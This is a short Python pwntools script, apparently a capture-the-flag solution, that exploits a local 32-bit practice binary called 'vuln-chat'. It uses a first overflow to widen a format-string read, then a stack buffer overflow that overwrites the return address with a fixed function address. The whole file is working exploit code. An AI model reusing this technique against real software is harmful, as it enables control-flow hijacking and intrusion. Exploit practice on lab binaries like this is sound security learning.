'''
Author: Samrito
Date: 2021-12-15 23:35:47
LastEditors: Samrito
LastEditTime: 2021-12-15 23:45:36
'''
from pwn import *

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

io = process(argv=['./vuln-chat'])

context.arch = 'i386'
context.log_level = 'debug'

debug('b * main')
io.recvuntil('username: ')
payload = flat([b'@'*(0x19-0x5), b'%99s'])
io.sendline(payload)

io.recvuntil('I can trust you?\n')
payload = flat([b'@'*(0x2d+4), 0x0804856b, 0xdeadbeef])

io.sendline(payload)

io.interactive()